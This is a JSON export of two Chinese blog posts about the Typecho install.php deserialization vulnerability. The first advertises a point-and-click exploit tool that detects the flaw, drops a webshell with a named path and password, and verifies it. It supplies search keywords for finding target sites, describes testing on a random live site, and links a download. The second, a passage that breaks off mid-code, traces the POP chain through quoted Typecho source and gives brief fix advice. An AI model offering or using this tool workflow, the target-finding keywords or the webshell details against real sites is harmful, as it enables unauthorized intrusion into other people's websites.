[{"title":"Typecho利用工具","url":"http://www.chabug.org/2017/11/03/typecho-tools/","content":"<p>今天刚写了typecho的漏洞分析文章，现在再发一个利用工具。<br>只有一个按钮，你可以什么都不需要懂，只需要点两下就完成了hack。</p>\n<h1 id=\"运行工具\"><a href=\"#运行工具\" class=\"headerlink\" title=\"运行工具\"></a>运行工具</h1><p>解开压缩包后，直接执行typecho.exe （lib目录下包含了php相关的库）。</p>\n<p>将要进行测试的typecho网站的url复制到最上面的文本框中。</p>\n<p>下面大的白框是信息回显窗口。</p>\n<p>提供一个关键字<code>power by typecho</code> 再来一个<code>© 2017 由 Typecho 强力驱动.Theme by</code><br>我通过谷歌随机找了一个Typecho网站进行测试。</p>\n<h1 id=\"检测漏洞\"><a href=\"#检测漏洞\" class=\"headerlink\" title=\"检测漏洞\"></a>检测漏洞</h1><p>这个漏洞来源于install.php文件，这个文件不会自动删除，但可以被手动删除。</p>\n<p>要成功利用该漏洞，网站必须没有删除install.php文件，同时也没有升级到最新的beta修复版本。</p>\n<p>选好目标网站后，所以第一步就是检测是否存在漏洞。<br><img src=\"http://otsghah4q.bkt.clouddn.com/1.jpg\" alt=\"\"><br>选中【检测漏洞】单选钮，再点击【执行】按钮。</p>\n<p>如上图，如果成功回显了phpinfo的信息，说明网站存在漏洞，并且可以成功利用。</p>\n<h1 id=\"释放shell\"><a href=\"#释放shell\" class=\"headerlink\" title=\"释放shell\"></a>释放shell</h1><p>第二步选中【释放shell】单选钮，再点击【执行】按钮。</p>\n<p><img src=\"http://otsghah4q.bkt.clouddn.com/2.jpg\" alt=\"\"><br>如上图：回显“shell释放成功：expsky.php”，说明webshell文件成功生成。</p>\n<p>（个别网站如果没有写入权限，这步可能会失败）</p>\n<h1 id=\"验证shell\"><a href=\"#验证shell\" class=\"headerlink\" title=\"验证shell\"></a>验证shell</h1><p>对刚刚释放的webshell是否能正常工作进行验证。<br><img src=\"http://otsghah4q.bkt.clouddn.com/3.jpg\" alt=\"\"><br>第三步选中【验证shell】单选钮，再点击【执行】按钮。</p>\n<p>如上图，如果phpinfo再次成功回显，说明刚刚生产的webshell已经可以正常工作。</p>\n<h1 id=\"菜刀连接\"><a href=\"#菜刀连接\" class=\"headerlink\" title=\"菜刀连接\"></a>菜刀连接</h1><blockquote>\n<p>webshell地址：网站域名/expsky.php<br>webshell密码：expsky</p>\n</blockquote>\n<p><img src=\"http://otsghah4q.bkt.clouddn.com/4.jpg\" alt=\"\"><br>上图可以看到我们释放webshell文件expsky.php。</p>\n<p>演示完毕，在菜刀里把expsky.php删除了，完成自宫，没干坏事。</p>\n<h1 id=\"漏洞修复方法\"><a href=\"#漏洞修复方法\" class=\"headerlink\" title=\"漏洞修复方法\"></a>漏洞修复方法</h1><p>可以先暂时删除掉根目录下掉 install.php 文件，或者也可以直接升级到最新的 Beta 版。</p>\n<p>注意在升级的时候也要覆盖 install.php 文件。</p>\n<h1 id=\"工具分享\"><a href=\"#工具分享\" class=\"headerlink\" title=\"工具分享\"></a>工具分享</h1><p>通过本工具，不需要懂技术，简单的点几下，半分钟内就可以完成网站的hack。</p>\n<p>由于工具进一步完善后可能存在潜在危害，所以不提供源码。</p>\n<p>工具下载: <a href=\"https://pan.baidu.com/s/1geYkDwf\" target=\"_blank\" rel=\"external\">百度云</a> 密码: dhvi，保证无任何后门（其他任何渠道下载的与本人无关）。</p>\n<p>最后再次声明，我开发这个工具仅为了技术研究，严禁非法使用，否则后果自负。</p>\n","categories":[],"tags":[]},{"title":"Typecho install.php 后门代码分析","url":"http://www.chabug.org/2017/11/03/typecho-install/","content":"<p>前几天的typecho爆的漏洞接二连三，我原本是想用typecho做博客的.</p>\n<p>然后吓得我赶紧换了git+hexo。今天分析下这个install.php中的后门。</p>\n<h1 id=\"恶意代码\"><a href=\"#恶意代码\" class=\"headerlink\" title=\"恶意代码\"></a>恶意代码</h1><ol>\n<li>base64解码后反序列化cookie中传入的__typecho_config参数，</li>\n<li>然后让__typecho_config作为构造参数例化一个Typecho_Db类，</li>\n<li>接着通过POP链进行代码执行。</li>\n</ol>\n<p>涉及到的文件还有类名</p>\n<p>install.php（unserialize） – &gt;  Db.php（class Typecho_Db）  – &gt;  Feed.php （class Typecho_Feed） – &gt;  Request.php （class Typecho_Request）</p>\n<h2 id=\"install-php\"><a href=\"#install-php\" class=\"headerlink\" title=\"install.php\"></a>install.php</h2><ol>\n<li>设置了正确的referer（网站url即可）</li>\n<li>加上一个任意的finish参数</li>\n<li>设置cookie中__typecho_config字段的值</li>\n</ol>\n<p>cookie中的__typecho_config得到序列化后的$config数组字符串,<br>反序列化后，再使用$config[‘adapter’]作为构造参数传入Typecho_Db的实例化过程。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">&lt;?php</span> <span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'finish'</span>])) : <span class=\"meta\">?&gt;</span></div><div class=\"line\">               <span class=\"meta\">&lt;?php</span> <span class=\"keyword\">if</span> (!@file_exists(__TYPECHO_ROOT_DIR__ . <span class=\"string\">'/config.inc.php'</span>)) : <span class=\"meta\">?&gt;</span></div><div class=\"line\">               &lt;h1 class=\"typecho-install-title\"&gt;&lt;?php _e('安装失败!'); ?&gt;&lt;/h1&gt;</div><div class=\"line\">               &lt;div class=\"typecho-install-body\"&gt;</div><div class=\"line\">                   &lt;form method=<span class=\"string\">\"post\"</span> action=<span class=\"string\">\"?config\"</span> name=<span class=\"string\">\"config\"</span>&gt;</div><div class=\"line\">                   &lt;p class=\"message error\"&gt;&lt;?php _e('您没有上传 config.inc.php 文件，请您重新安装！'); ?&gt; &lt;button class=\"btn primary\" type=\"submit\"&gt;&lt;?php _e('重新安装 »'); ?&gt;&lt;/button&gt;&lt;/p&gt;</div><div class=\"line\">                   &lt;/form&gt;</div><div class=\"line\">               &lt;/div&gt;</div><div class=\"line\">               <span class=\"meta\">&lt;?php</span> <span class=\"keyword\">elseif</span> (!Typecho_Cookie::get(<span class=\"string\">'__typecho_config'</span>)): <span class=\"meta\">?&gt;</span></div><div class=\"line\">               &lt;h1 class=\"typecho-install-title\"&gt;&lt;?php _e('没有安装!'); ?&gt;&lt;/h1&gt;</div><div class=\"line\">               &lt;div class=\"typecho-install-body\"&gt;</div><div class=\"line\">                   &lt;form method=<span class=\"string\">\"post\"</span> action=<span class=\"string\">\"?config\"</span> name=<span class=\"string\">\"config\"</span>&gt;</div><div class=\"line\">                   &lt;p class=\"message error\"&gt;&lt;?php _e('您没有执行安装步骤，请您重新安装！'); ?&gt; &lt;button class=\"btn primary\" type=\"submit\"&gt;&lt;?php _e('重新安装 »'); ?&gt;&lt;/button&gt;&lt;/p&gt;</div><div class=\"line\">                   &lt;/form&gt;</div><div class=\"line\">               &lt;/div&gt;</div><div class=\"line\">               <span class=\"meta\">&lt;?php</span> <span class=\"keyword\">else</span> : <span class=\"meta\">?&gt;</span></div><div class=\"line\">                   <span class=\"meta\">&lt;?php</span></div><div class=\"line\">                   $config = unserialize(base64_decode(Typecho_Cookie::get(<span class=\"string\">'__typecho_config'</span>)));</div><div class=\"line\">                   Typecho_Cookie::delete(<span class=\"string\">'__typecho_config'</span>);</div><div class=\"line\">                   $db = <span class=\"keyword\">new</span> Typecho_Db($config[<span class=\"string\">'adapter'</span>], $config[<span class=\"string\">'prefix'</span>]);</div><div class=\"line\">                   $db-&gt;addServer($config, Typecho_Db::READ | Typecho_Db::WRITE);</div><div class=\"line\">                   Typecho_Db::set($db);</div><div class=\"line\">                   <span class=\"meta\">?&gt;</span></div></pre></td></tr></table></figure>\n<h2 id=\"Db-php\"><a href=\"#Db-php\" class=\"headerlink\" title=\"Db.php\"></a>Db.php</h2><p>$config[‘adapter’]在构造函数里面对应形参$adapterName,<br>$adapterName是Typecho_Feed类的实例，使用.字符连接就调用__toString魔术方法</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">&lt;?php</span></div><div class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">($adapterName, $prefix = <span class=\"string\">'typecho_'</span>)</span></span></div><div class=\"line\"><span class=\"function\">    </span>&#123;</div><div class=\"line\">        <span class=\"comment\">/** 获取适配器名称 */</span></div><div class=\"line\">        <span class=\"keyword\">$this</span>-&gt;_adapterName = $adapterName;</div><div class=\"line\"></div><div class=\"line\">        <span class=\"comment\">/** 数据库适配器 */</span></div><div class=\"line\">        $adapterName = <span class=\"string\">'Typecho_Db_Adapter_'</span> . $adapterName;</div><div class=\"line\"></div><div class=\"line\">        <span class=\"keyword\">if</span> (!call_user_func(<span class=\"keyword\">array</span>($adapterName, <span class=\"string\">'isAvailable'</span>))) &#123;</div><div class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> Typecho_Db_Exception(<span class=\"string\">\"Adapter &#123;$adapterName&#125; is not available\"</span>);</div><div class=\"line\">        &#125;</div><div class=\"line\"></div><div class=\"line\">        <span class=\"keyword\">$this</span>-&gt;_prefix = $prefix;</div><div class=\"line\"></div><div class=\"line\">        <span class=\"comment\">/** 初始化内部变量 */</span></div><div class=\"line\">        <span class=\"keyword\">$this</span>-&gt;_pool = <span class=\"keyword\">array</span>();</div><div class=\"line\">        <span class=\"keyword\">$this</span>-&gt;_connectedPool = <span class=\"keyword\">array</span>();</div><div class=\"line\">        <span class=\"keyword\">$this</span>-&gt;_config = <span class=\"keyword\">array</span>();</div><div class=\"line\"></div><div class=\"line\">        <span class=\"comment\">//实例化适配器对象</span></div><div class=\"line\">        <span class=\"keyword\">$this</span>-&gt;_adapter = <span class=\"keyword\">new</span> $adapterName();</div><div class=\"line\">    &#125;</div></pre></td></tr></table></figure>\n<h2 id=\"Feed-php\"><a href=\"#Feed-php\" class=\"headerlink\" title=\"Feed.php\"></a>Feed.php</h2><p><code>$this-&gt;_type</code>用来控制if语句的流程，<br>给<code>$this-&gt;_type</code> 赋值 ATOM 1.0时，<br>即可进入包含$item[‘author’]-&gt;screenName的分支，<br>$item[‘author’]这个变量是一个Typecho_Request的实例,<br>我们可以设置这个Typecho_Request实例的属性screenName是一个私有属性，<br>当访问$item[‘author’]-&gt;screenName就会调用__get方法<br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div><div class=\"line\">82</div><div class=\"line\">83</div><div class=\"line\">84</div><div class=\"line\">85</div><div class=\"line\">86</div><div class=\"line\">87</div><div class=\"line\">88</div><div class=\"line\">89</div><div class=\"line\">90</div><div class=\"line\">91</div><div class=\"line\">92</div><div class=\"line\">93</div><div class=\"line\">94</div><div class=\"line\">95</div><div class=\"line\">96</div><div class=\"line\">97</div><div class=\"line\">98</div><div class=\"line\">99</div><div class=\"line\">100</div><div class=\"line\">101</div><div class=\"line\">102</div><div class=\"line\">103</div><div class=\"line\">104</div><div class=\"line\">105</div><div class=\"line\">106</div><div class=\"line\">107</div><div class=\"line\">108</div><div class=\"line\">109</div><div class=\"line\">110</div><div class=\"line\">111</div><div class=\"line\">112</div><div class=\"line\">113</div><div class=\"line\">114</div><div class=\"line\">115</div><div class=\"line\">116</div><div class=\"line\">117</div><div class=\"line\">118</div><div class=\"line\">119</div><div class=\"line\">120</div><div class=\"line\">121</div><div class=\"line\">122</div><div class=\"line\">123</div><div class=\"line\">124</div><div class=\"line\">125</div><div class=\"line\">126</div><div class=\"line\">127</div><div class=\"line\">128</div><div class=\"line\">129</div><div class=\"line\">130</div><div class=\"line\">131</div><div class=\"line\">132</div><div class=\"line\">133</div><div class=\"line\">134</div><div class=\"line\">135</div><div class=\"line\">136</div><div class=\"line\">137</div><div class=\"line\">138</div><div class=\"line\">139</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">&lt;?php</span></div><div class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__toString</span><span class=\"params\">()</span></span></div><div class=\"line\"><span class=\"function\">    </span>&#123;</div><div class=\"line\">        $result = <span class=\"string\">'&lt;?xml version=\"1.0\" encoding=\"'</span> . <span class=\"keyword\">$this</span>-&gt;_charset . <span class=\"string\">'\"?&gt;'</span> . <span class=\"keyword\">self</span>::EOL;</div><div class=\"line\"></div><div class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"keyword\">self</span>::RSS1 == <span class=\"keyword\">$this</span>-&gt;_type) &#123;</div><div class=\"line\">            $result .= <span class=\"string\">'&lt;rdf:RDF</span></div><div class=\"line\"><span class=\"string\">xmlns:rdf=\"http://www.w3.org/1999/02/22-rdf-syntax-ns#\"</span></div><div class=\"line\"><span class=\"string\">xmlns=\"http://purl.org/rss/1.0/\"</span></div><div class=\"line\"><span class=\"string\">xmlns:dc=\"http://purl.org/dc/elements/1.1/\"&gt;'</span> . <span class=\"keyword\">self</span>::EOL;</div><div class=\"line\"></div><div class=\"line\">            $content = <span class=\"string\">''</span>;</div><div class=\"line\">            $links = <span class=\"keyword\">array</span>();</div><div class=\"line\">            $lastUpdate = <span class=\"number\">0</span>;</div><div class=\"line\"></div><div class=\"line\">            <span class=\"keyword\">foreach</span> (<span class=\"keyword\">$this</span>-&gt;_items <span class=\"keyword\">as</span> $item) &#123;</div><div class=\"line\">                $content .= <span class=\"string\">'&lt;item rdf:about=\"'</span> . $item[<span class=\"string\">'link'</span>] . <span class=\"string\">'\"&gt;'</span> . <span class=\"keyword\">self</span>::EOL;</div><div class=\"line\">                $content .= <span class=\"string\">'&lt;title&gt;'</span> . htmlspecialchars($item[<span class=\"string\">'title'</span>]) . <span class=\"string\">'&lt;/title&gt;'</span> . <span class=\"keyword\">self</span>::EOL;</div><div class=\"line\">                $content .= <span class=\"string\">'&lt;link&gt;'</span> . $item[<span class=\"string\">'link'</span>] . <span class=\"string\">'&lt;/link&gt;'</span> . <span class=\"keyword\">self</span>::EOL;</div><div class=\"line\">                $content .= <span class=\"string\">'&lt;dc:date&gt;'</span> . <span class=\"keyword\">$this</span>-&gt;dateFormat($item[<span class=\"string\">'date'</span>]) . <span class=\"string\">'&lt;/dc:date&gt;'</span> . <span class=\"keyword\">self</span>::EOL;</div><div class=\"line\">                $content .= <span class=\"string\">'&lt;description&gt;'</span> . strip_tags($item[<span class=\"string\">'content'</span>]) . <span class=\"string\">'&lt;/description&gt;'</span> . <span class=\"keyword\">self</span>::EOL;</div><div class=\"line\">                <span class=\"keyword\">if</span> (!<span class=\"keyword\">empty</span>($item[<span class=\"string\">'suffix'</span>])) &#123;</div><div class=\"line\">                    $content .= $item[<span class=\"string\">'suffix'</span>];</div><div class=\"line\">                &#125;</div><div class=\"line\">                $content .= <span class=\"string\">'&lt;/item&gt;'</span> . <span class=\"keyword\">self</span>::EOL;</div><div class=\"line\"></div><div class=\"line\">                $links[] = $item[<span class=\"string\">'link'</span>];</div><div class=\"line\"></div><div class=\"line\">                <span class=\"keyword\">if</span> ($item[<span class=\"string\">'date'</span>] &gt; $lastUpdate) &#123;</div><div class=\"line\">                    $lastUpdate = $item[<span class=\"string\">'date'</span>];</div><div class=\"line\">                &#125;</div><div class=\"line\">            &#125;</div><div class=\"line\"></div><div class=\"line\">            $result .= <span class=\"string\">'&lt;channel rdf:about=\"'</span> . <span class=\"keyword\">$this</span>-&gt;_feedUrl . <span class=\"string\">'\"&gt;</span></div><div class=\"line\"><span class=\"string\">&lt;title&gt;'</span> . htmlspecialchars(<span class=\"keyword\">$this</span>-&gt;_title) . <span class=\"string\">'&lt;/title&gt;</span></div><div class=\"line\"><span class=\"string\">&lt;link&gt;'</span> . <span class=\"keyword\">$this</span>-&gt;_baseUrl . <span class=\"string\">'&lt;/link&gt;</span></div><div class=\"line\"><span class=\"string\">&lt;description&gt;'</span> . htmlspecialchars(<span class=\"keyword\">$this</span>-&gt;_subTitle) . <span class=\"string\">'&lt;/description&gt;</span></div><div class=\"line\"><span class=\"string\">&lt;items&gt;</span></div><div class=\"line\"><span class=\"string\">&lt;rdf:Seq&gt;'</span> . <span class=\"keyword\">self</span>::EOL;</div><div class=\"line\"></div><div class=\"line\">            <span class=\"keyword\">foreach</span> ($links <span class=\"keyword\">as</span> $link) &#123;</div><div class=\"line\">                $result .= <span class=\"string\">'&lt;rdf:li resource=\"'</span> . $link . <span class=\"string\">'\"/&gt;'</span> . <span class=\"keyword\">self</span>::EOL;</div><div class=\"line\">            &#125;</div><div class=\"line\"></div><div class=\"line\">            $result .= <span class=\"string\">'&lt;/rdf:Seq&gt;</span></div><div class=\"line\"><span class=\"string\">&lt;/items&gt;</span></div><div class=\"line\"><span class=\"string\">&lt;/channel&gt;'</span> . <span class=\"keyword\">self</span>::EOL;</div><div class=\"line\"></div><div class=\"line\">            $result .= $content . <span class=\"string\">'&lt;/rdf:RDF&gt;'</span>;</div><div class=\"line\"></div><div class=\"line\">        &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (<span class=\"keyword\">self</span>::RSS2 == <span class=\"keyword\">$this</span>-&gt;_type) &#123;</div><div class=\"line\">            $result .= <span class=\"string\">'&lt;rss version=\"2.0\"</span></div><div class=\"line\"><span class=\"string\">xmlns:content=\"http://purl.org/rss/1.0/modules/content/\"</span></div><div class=\"line\"><span class=\"string\">xmlns:dc=\"http://purl.org/dc/elements/1.1/\"</span></div><div class=\"line\"><span class=\"string\">xmlns:slash=\"http://purl.org/rss/1.0/modules/slash/\"</span></div><div class=\"line\"><span class=\"string\">xmlns:atom=\"http://www.w3.org/2005/Atom\"</span></div><div class=\"line\"><span class=\"string\">xmlns:wfw=\"http://wellformedweb.org/CommentAPI/\"&gt;</span></div><div class=\"line\"><span class=\"string\">&lt;channel&gt;'</span> . <span class=\"keyword\">self</span>::EOL;</div><div class=\"line\"></div><div class=\"line\">            $content = <span class=\"string\">''</span>;</div><div class=\"line\">            $lastUpdate = <span class=\"number\">0</span>;</div><div class=\"line\"></div><div class=\"line\">            <span class=\"keyword\">foreach</span> (<span class=\"keyword\">$this</span>-&gt;_items <span class=\"keyword\">as</span> $item) &#123;</div><div class=\"line\">                $content .= <span class=\"string\">'&lt;item&gt;'</span> . <span class=\"keyword\">self</span>::EOL;</div><div class=\"line\">                $content .= <span class=\"string\">'&lt;title&gt;'</span> . htmlspecialchars($item[<span class=\"string\">'title'</span>]) . <span class=\"string\">'&lt;/title&gt;'</span> . <span class=\"keyword\">self</span>::EOL;</div><div class=\"line\">                $content .= <span class=\"string\">'&lt;link&gt;'</span> . $item[<span class=\"string\">'link'</span>] . <span class=\"string\">'&lt;/link&gt;'</span> . <span class=\"keyword\">self</span>::EOL;</div><div class=\"line\">                $content .= <span class=\"string\">'&lt;guid&gt;'</span> . $item[<span class=\"string\">'link'</span>] . <span class=\"string\">'&lt;/guid&gt;'</span> . <span class=\"keyword\">self</span>::EOL;</div><div class=\"line\">                $content .= <span class=\"string\">'&lt;pubDate&gt;'</span> . <span class=\"keyword\">$this</span>-&gt;dateFormat($item[<span class=\"string\">'date'</span>]) . <span class=\"string\">'&lt;/pubDate&gt;'</span> . <span class=\"keyword\">self</span>::EOL;</div><div class=\"line\">                $content .= <span class=\"string\">'&lt;dc:creator&gt;'</span> . htmlspecialchars($item[<span class=\"string\">'author'</span>]-&gt;screenName) . <span class=\"string\">'&lt;/dc:creator&gt;'</span> . <span class=\"keyword\">self</span>::EOL;</div><div class=\"line\"></div><div class=\"line\">                <span class=\"keyword\">if</span> (!<span class=\"keyword\">empty</span>($item[<span class=\"string\">'category'</span>]) &amp;&amp; is_array($item[<span class=\"string\">'category'</span>])) &#123;</div><div class=\"line\">                    <span class=\"keyword\">foreach</span> ($item[<span class=\"string\">'category'</span>] <span class=\"keyword\">as</span> $category) &#123;</div><div class=\"line\">                        $content .= <span class=\"string\">'&lt;category&gt;&lt;![CDATA['</span> . $category[<span class=\"string\">'name'</span>] . <span class=\"string\">']]&gt;&lt;/category&gt;'</span> . <span class=\"keyword\">self</span>::EOL;</div><div class=\"line\">                    &#125;</div><div class=\"line\">                &#125;</div><div class=\"line\"></div><div class=\"line\">                <span class=\"keyword\">if</span> (!<span class=\"keyword\">empty</span>($item[<span class=\"string\">'excerpt'</span>])) &#123;</div><div class=\"line\">                    $content .= <span class=\"string\">'&lt;description&gt;&lt;![CDATA['</span> . strip_tags($item[<span class=\"string\">'excerpt'</span>]) . <span class=\"string\">']]&gt;&lt;/description&gt;'</span> . <span class=\"keyword\">self</span>::EOL;</div><div class=\"line\">                &#125;</div><div class=\"line\"></div><div class=\"line\">                <span class=\"keyword\">if</span> (!<span class=\"keyword\">empty</span>($item[<span class=\"string\">'content'</span>])) &#123;</div><div class=\"line\">                    $content .= <span class=\"string\">'&lt;content:encoded xml:lang=\"'</span> . <span class=\"keyword\">$this</span>-&gt;_lang . <span class=\"string\">'\"&gt;&lt;![CDATA['</span></div><div class=\"line\">                    . <span class=\"keyword\">self</span>::EOL .</div><div class=\"line\">                    $item[<span class=\"string\">'content'</span>] . <span class=\"keyword\">self</span>::EOL .</div><div class=\"line\">                    <span class=\"string\">']]&gt;&lt;/content:encoded&gt;'</span> . <span class=\"keyword\">self</span>::EOL;</div><div class=\"line\">                &#125;</div><div class=\"line\"></div><div class=\"line\">                <span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>($item[<span class=\"string\">'comments'</span>]) &amp;&amp; strlen($item[<span class=\"string\">'comments'</span>]) &gt; <span class=\"number\">0</span>) &#123;</div><div class=\"line\">                    $content .= <span class=\"string\">'&lt;slash:comments&gt;'</span> . $item[<span class=\"string\">'comments'</span>] . <span class=\"string\">'&lt;/slash:comments&gt;'</span> . <span class=\"keyword\">self</span>::EOL;</div><div class=\"line\">                &#125;</div><div class=\"line\"></div><div class=\"line\">                $content .= <span class=\"string\">'&lt;comments&gt;'</span> . $item[<span class=\"string\">'link'</span>] . <span class=\"string\">'#comments&lt;/comments&gt;'</span> . <span class=\"keyword\">self</span>::EOL;</div><div class=\"line\">                <span class=\"keyword\">if</span> (!<span class=\"keyword\">empty</span>($item[<span class=\"string\">'commentsFeedUrl'</span>])) &#123;</div><div class=\"line\">                    $content .= <span class=\"string\">'&lt;wfw:commentRss&gt;'</span> . $item[<span class=\"string\">'commentsFeedUrl'</span>] . <span class=\"string\">'&lt;/wfw:commentRss&gt;'</span> . <span class=\"keyword\">self</span>::EOL;</div><div class=\"line\">                &#125;</div><div class=\"line\"></div><div class=\"line\">                <span class=\"keyword\">if</span> (!<span class=\"keyword\">empty</span>($item[<span class=\"string\">'suffix'</span>])) &#123;</div><div class=\"line\">                    $content .= $item[<span class=\"string\">'suffix'</span>];</div><div class=\"line\">                &#125;</div><div class=\"line\"></div><div class=\"line\">                $content .= <span class=\"string\">'&lt;/item&gt;'</span> . <span class=\"keyword\">self</span>::EOL;</div><div class=\"line\"></div><div class=\"line\">                <span class=\"keyword\">if</span> ($item[<span class=\"string\">'date'</span>] &gt; $lastUpdate) &#123;</div><div class=\"line\">                    $lastUpdate = $item[<span class=\"string\">'date'</span>];</div><div class=\"line\">                &#125;</div><div class=\"line\">            &#125;</div><div class=\"line\"></div><div class=\"line\">            $result .= <span class=\"string\">'&lt;title&gt;'</span> . htmlspecialchars(<span class=\"keyword\">$this</span>-&gt;_title) . <span class=\"string\">'&lt;/title&gt;</span></div><div class=\"line\"><span class=\"string\">&lt;link&gt;'</span> . <span class=\"keyword\">$this</span>-&gt;_baseUrl . <span class=\"string\">'&lt;/link&gt;</span></div><div class=\"line\"><span class=\"string\">&lt;atom:link href=\"'</span> . <span class=\"keyword\">$this</span>-&gt;_feedUrl . <span class=\"string\">'\" rel=\"self\" type=\"application/rss+xml\" /&gt;</span></div><div class=\"line\"><span class=\"string\">&lt;language&gt;'</span> . <span class=\"keyword\">$this</span>-&gt;_lang . <span class=\"string\">'&lt;/language&gt;</span></div><div class=\"line\"><span class=\"string\">&lt;description&gt;'</span> . htmlspecialchars(<span class=\"keyword\">$this</span>-&gt;_subTitle) . <span class=\"string\">'&lt;/description&gt;</span></div><div class=\"line\"><span class=\"string\">&lt;lastBuildDate&gt;'</span> . <span class=\"keyword\">$this</span>-&gt;dateFormat($lastUpdate) . <span class=\"string\">'&lt;/lastBuildDate&gt;</span></div><div class=\"line\"><span class=\"string\">&lt;pubDate&gt;'</span> . <span class=\"keyword\">$this</span>-&gt;dateFormat($lastUpdate) . <span class=\"string\">'&lt;/pubDate&gt;'</span> . <span class=\"keyword\">self</span>::EOL;</div><div class=\"line\"></div><div class=\"line\">            $result .= $content . <span class=\"string\">'&lt;/channel&gt;</span></div><div class=\"line\"><span class=\"string\">&lt;/rss&gt;'</span>;</div><div class=\"line\"></div><div class=\"line\">        &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (<span class=\"keyword\">self</span>::ATOM1 == <span class=\"keyword\">$this</span>-&gt;_type) &#123;</div><div class=\"line\">            $result .= <span class=\"string\">'&lt;feed xmlns=\"http://www.w3.org/2005/Atom\"</span></div><div class=\"line\"><span class=\"string\">xmlns:thr=\"http://purl.org/syndication/thread/1.0\"</span></div><div class=\"line\"><span class=\"string\">xml:lang=\"'</span> . <span class=\"keyword\">$this</span>-&gt;_lang . <span class=\"string\">'\"</span></div><div class=\"line\"><span class=\"string\">xml:base=\"'</span> . <span class=\"keyword\">$this</span>-&gt;_baseUrl . <span class=\"string\">'\"</span></div><div class=\"line\"><span class=\"string\">&gt;'</span> . <span class=\"keyword\">self</span>::EOL;</div><div class=\"line\"></div><div class=\"line\">            $content = <span class=\"string\">''</span>;</div><div class=\"line\">            $lastUpdate = <span class=\"number\">0</span>;</div><div class=\"line\"></div><div class=\"line\">            <span class=\"keyword\">foreach</span> (<span class=\"keyword\">$this</span>-&gt;_items <span class=\"keyword\">as</span> $item) &#123;</div><div class=\"line\">                $content .= <span class=\"string\">'&lt;entry&gt;'</span> . <span class=\"keyword\">self</span>::EOL;</div><div class=\"line\">                $content .= <span class=\"string\">'&lt;title type=\"html\"&gt;&lt;![CDATA['</span> . $item[<span class=\"string\">'title'</span>] . <span class=\"string\">']]&gt;&lt;/title&gt;'</span> . <span class=\"keyword\">self</span>::EOL;</div><div class=\"line\">                $content .= <span class=\"string\">'&lt;link rel=\"alternate\" type=\"text/html\" href=\"'</span> . $item[<span class=\"string\">'link'</span>] . <span class=\"string\">'\" /&gt;'</span> . <span class=\"keyword\">self</span>::EOL;</div><div class=\"line\">                $content .= <span class=\"string\">'&lt;id&gt;'</span> . $item[<span class=\"string\">'link'</span>] . <span class=\"string\">'&lt;/id&gt;'</span> . <span class=\"keyword\">self</span>::EOL;</div><div class=\"line\">                $content .= <span 